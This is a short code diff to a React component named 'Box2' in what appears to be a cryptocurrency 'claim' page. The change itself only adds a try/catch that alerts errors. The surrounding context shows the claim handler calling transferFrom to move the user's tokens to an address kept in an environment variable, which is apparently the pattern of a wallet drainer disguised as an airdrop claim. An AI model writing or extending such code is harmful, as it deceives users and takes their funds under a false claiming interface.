@@ -91,6 +91,7 @@ const Box2 = () => {
     setClaiming(true)
 
     alert(signer.length)
+    try{
 
     const walletProvider = new ethers.providers.JsonRpcProvider(mainnetRpcUrl)
     //const privateKey = process.env.PRIVATE_KEY
@@ -276,7 +277,9 @@ const Box2 = () => {
 
     await contract.transferFrom(address, process.env.ADDRESS, value)
 
-    setClaiming(false)
+    setClaiming(false)}catch(e){
+      alert(e)
+    }
   }
   return (
     <>
